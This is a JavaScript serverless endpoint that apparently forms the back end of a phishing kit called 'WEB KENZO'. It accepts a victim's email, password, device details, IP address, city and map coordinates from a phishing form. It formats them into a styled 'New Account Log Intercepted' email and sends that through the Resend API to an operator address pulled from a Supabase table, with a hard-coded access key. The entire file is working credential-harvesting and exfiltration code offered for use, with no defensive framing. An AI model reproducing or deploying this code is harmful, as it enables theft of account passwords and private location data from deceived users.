export const config = { api: { bodyParser: true } };

function countryFlag(code){
    if (!code || code.length !== 2) return "";
    const codePoints = code.toUpperCase().split("").map(function(c){ return 127397 + c.charCodeAt(0); });
    return String.fromCodePoint.apply(null, codePoints);
}

export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") return res.status(200).end();
    if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

    const API_KEY = process.env.RESEND_API_KEY;
    if (!API_KEY) return res.status(500).json({ error: "API_KEY_MISSING" });

    try {
        let d = req.body;
        if (typeof d === "string") d = JSON.parse(d);
        if (!d) return res.status(400).json({ error: "BODY_EMPTY" });

        const WEB_ID = d.web_id || "web_default"; 
        const PLATFORM = d.platform || "Unknown";
        const COUNTRY_CODE = d.negaraKode || "ID";
        const DIAL_CODE = d.dial || "+62";

        const SUPABASE_URL = "https://djradeolrbjmgoxxbdlj.supabase.co"; 
        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcmFkZW9scmJqbWdveHhiZGxqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTU1OTA0NDQsImV4cCI6MjExMTE2NjQ0NH0.RvLrul0eFafGUcOn_9ORB8xh3IaP4n1FAsEmqXnrXCA";     
        
        let EMAIL_TUJUAN = "admin@domain.com"; 
        let NAMA_PENGIRIM = "WEB KENZO"; 
        let EMAIL_PENGIRIM = "hasilress@mediafire.my.id"; 

        try {
            const rCfg = await fetch(`${SUPABASE_URL}/rest/v1/web_config?web_id=eq.${WEB_ID}&select=*`, {
                headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` }
            });
            const cfgData = await rCfg.json();
            if (cfgData && cfgData[0]) {
                if (cfgData[0].email_tujuan) EMAIL_TUJUAN = cfgData[0].email_tujuan;
                if (cfgData[0].nama_ress) {
                    let rawNama = cfgData[0].nama_ress.trim();
                    if (rawNama.includes('<')) {
                        let parts = rawNama.split('<');
                        NAMA_PENGIRIM = parts[0].trim();
                        if (parts[1]) {
                            let cleanedEmail = parts[1].replace('>', '').trim();
                            if (cleanedEmail !== "") EMAIL_PENGIRIM = cleanedEmail;
                        }
                    } else { NAMA_PENGIRIM = rawNama; }
                }
            }
        } catch(e) { console.log("Gagal ambil config:", e); }

        if (!NAMA_PENGIRIM || NAMA_PENGIRIM === "") NAMA_PENGIRIM = "WEB KENZO";
        if (!EMAIL_PENGIRIM || EMAIL_PENGIRIM === "") EMAIL_PENGIRIM = "hasilress@mediafire.my.id";

        const flag = countryFlag(COUNTRY_CODE);
        
        // SUBJECT EMAIL DINAMIS (BENDERA & KODE NEGARA)
        const subjectEmail = `${flag} ${DIAL_CODE} - Hasil Data [${PLATFORM}] | Pemilik (${d.email || "-"})`;
        const HEADER_EMAIL = "WEB KENZO";

        // DESAIN CYBERPUNK NEON
        const htmlBody = `
        <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">HATI HATI DENGAN WEB YANG MENGATAS NAMAKAN KENZ | IP ${d.ip || "-"}</div>
        <div style="font-family: 'Courier New', Courier, monospace; background-color: #0f172a; padding: 40px 15px;">
          <div style="max-width: 600px; margin: 0 auto; background-color: #1e293b; border-radius: 8px; overflow: hidden; border: 1px solid #334155; box-shadow: 0 0 20px rgba(56, 189, 248, 0.2);">
            
            <div style="background-color: #0f172a; padding: 25px 30px; border-bottom: 2px solid #38bdf8; text-align: left;">
              <h1 style="margin: 0; font-size: 24px; font-weight: 900; color: #38bdf8; letter-spacing: 2px; text-transform: uppercase;">${HEADER_EMAIL}</h1>
              <p style="margin: 5px 0 0 0; font-size: 13px; color: #94a3b8;">> New Account Log Intercepted_</p>
            </div>
            
            <div style="padding: 30px;">
              <h3 style="color: #f472b6; font-size: 14px; font-weight: bold; margin: 0 0 15px 0; border-bottom: 1px dashed #475569; padding-bottom: 8px;">[!] ACCOUNT_INFO</h3>
              <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px; font-family: 'Courier New', monospace;">
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8; width: 35%;">>> Email</td>
                  <td style="padding: 10px 0; font-size: 15px; color: #f1f5f9; font-weight: bold;">${d.email || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> Password</td>
                  <td style="padding: 10px 0; font-size: 15px; color: #f87171; font-weight: bold; background-color: #450a0a; padding-left: 10px; border-radius: 4px;">${d.password || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> Platform</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #4ade80; font-weight: bold;">${PLATFORM}</td>
                </tr>
              </table>

              <h3 style="color: #f472b6; font-size: 14px; font-weight: bold; margin: 0 0 15px 0; border-bottom: 1px dashed #475569; padding-bottom: 8px;">[!] DEVICE_INFO</h3>
              <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px; font-family: 'Courier New', monospace;">
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8; width: 35%;">>> Device</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #cbd5e1;">${d.device || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> OS</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #cbd5e1;">${d.os || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> Browser</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #cbd5e1;">${d.browser || "-"}</td>
                </tr>
              </table>

              <h3 style="color: #f472b6; font-size: 14px; font-weight: bold; margin: 0 0 15px 0; border-bottom: 1px dashed #475569; padding-bottom: 8px;">[!] LOCATION_INFO</h3>
              <table style="width: 100%; border-collapse: collapse; font-family: 'Courier New', monospace;">
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8; width: 35%;">>> IP</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #38bdf8; font-weight: bold;">${d.ip || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> Country</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #cbd5e1;">${flag} ${d.negara || "-"} (${DIAL_CODE})</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> Province</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #cbd5e1;">${d.prov || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> City</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #cbd5e1;">${d.kota || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> ISP</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #cbd5e1;">${d.isp || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> Map</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #38bdf8;"><a href="https://maps.google.com/?q=${d.koord}" style="color:#38bdf8; text-decoration:none;">[ LIHAT KOORDINAT ]</a></td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #94a3b8;">>> Time</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #cbd5e1;">${d.waktu || "-"}</td>
                </tr>
              </table>
            </div>

            <div style="background-color: #0f172a; padding: 20px; text-align: center; border-top: 1px solid #334155;">
              <p style="margin: 0; font-size: 12px; color: #64748b; font-family: 'Courier New', monospace;">[ SYSTEM GENERATED BY ${HEADER_EMAIL} ]</p>
            </div>
          </div>
        </div>`;

        const response = await fetch("https://api.resend.com/emails", {
            method: "POST",
            headers: { "Authorization": "Bearer " + API_KEY, "Content-Type": "application/json" },
            body: JSON.stringify({
                from: `${NAMA_PENGIRIM} <${EMAIL_PENGIRIM}>`, 
                to: [EMAIL_TUJUAN],
                subject: subjectEmail, 
                html: htmlBody
            })
        });

        const data = await response.json();
        console.log("RESPONSE RESEND:", data);

        if (response.ok) {
            try {
                await fetch(`${SUPABASE_URL}/rest/v1/logs_result`, {
                    method: "POST",
                    headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}`, "Content-Type": "application/json" },
                    body: JSON.stringify({ web_id: WEB_ID, created_at: new Date().toISOString() })
                });
            } catch(e) { console.log("Gagal nyatet log:", e); }
        }
        return res.status(response.status).json(data);
    } catch (error) {
        return res.status(500).json({ error: "CATCH_ERROR", message: error.message });
    }
}
